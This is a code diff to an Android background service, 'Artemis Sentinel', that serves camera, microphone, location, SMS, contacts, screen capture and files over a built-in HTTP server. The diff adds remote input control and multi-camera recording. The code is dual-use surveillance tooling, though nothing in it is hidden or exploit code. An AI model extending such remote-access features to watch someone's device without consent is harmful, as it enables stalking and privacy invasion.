@@ -27,8 +27,10 @@ import com.example.artemis.feature.DeviceInfoProvider
 import com.example.artemis.feature.FileSystemHelper
 import com.example.artemis.feature.LocationTracker
 import com.example.artemis.feature.MicController
+import com.example.artemis.feature.RemoteInputController
 import com.example.artemis.feature.ScreenCaptureController
 import com.example.artemis.feature.SmsProvider
+import com.example.artemis.feature.TripleRecorder
 import com.example.artemis.feature.VideoRecorder
 import com.example.artemis.server.SimpleHttpServer
 import kotlinx.coroutines.CoroutineScope
@@ -55,6 +57,8 @@ class ArtemisSentinelService : LifecycleService() {
     private lateinit var cameraFeedController: CameraFeedController
     private lateinit var contactsProvider: ContactsProvider
     private lateinit var fileSystemHelper: FileSystemHelper
+    private lateinit var remoteInputController: RemoteInputController
+    private lateinit var tripleRecorder: TripleRecorder
     private lateinit var artemisServer: SimpleHttpServer
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -108,6 +112,8 @@ class ArtemisSentinelService : LifecycleService() {
         cameraFeedController = CameraFeedController(this, cameraController)
         contactsProvider = ContactsProvider(this)
         fileSystemHelper = FileSystemHelper(this)
+        remoteInputController = RemoteInputController(this)
+        tripleRecorder = TripleRecorder(this, this, cameraController)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -136,7 +142,25 @@ class ArtemisSentinelService : LifecycleService() {
         if (isRunning) return
         isRunning = true
 
-        startForeground(NOTIFICATION_ID, createNotification(0))
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                // Android 14+: explicitly specify FGS types to avoid the system
+                // pulling ALL manifest-declared types (which may include types
+                // whose permissions aren't granted on every OEM).
+                startForeground(
+                    NOTIFICATION_ID, createNotification(0),
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                            or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                )
+            } else {
+                startForeground(NOTIFICATION_ID, createNotification(0))
+            }
+        } catch (e: Exception) {
+            android.util.Log.e("ArtemisSvc", "startForeground failed: ${e.message}", e)
+            isRunning = false
+            stopSelf()
+            return
+        }
         acquireWakeLock()
         registerDozeRecovery()
 
@@ -155,7 +179,9 @@ class ArtemisSentinelService : LifecycleService() {
             screenCaptureController = ScreenCaptureController.get(this),
             fileSystemHelper = fileSystemHelper,
             contactsProvider = contactsProvider,
-            batteryHelper = BatteryHelper(this)
+            batteryHelper = BatteryHelper(this),
+            remoteInputController = remoteInputController,
+            tripleRecorder = tripleRecorder
         )
 
         serviceScope.launch {
@@ -233,7 +259,7 @@ class ArtemisSentinelService : LifecycleService() {
             "$deviceName — up $uptime"
         }
         return NotificationCompat.Builder(this, ArtemisApp.CHANNEL_SERVICE)
-            .setContentTitle("Artemis Sentinel v2.3.0 Active")
+            .setContentTitle("Artemis Sentinel v2.3.3 Active")
             .setContentText(contentText)
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -329,6 +355,8 @@ class ArtemisSentinelService : LifecycleService() {
         isRunning = false
         app.serverRef = null
         unregisterDozeRecovery()
+        // Stop any in-flight triple recording cleanly (finalizes MP4s).
+        try { tripleRecorder.release() } catch (_: Exception) { }
         // IMPORTANT: close the socket properly. Without this, the bound
         // ServerSocket leaks — TCP still shows LISTEN but the accept loop
         // is cancelled and the wake lock is released, i.e. a zombie socket
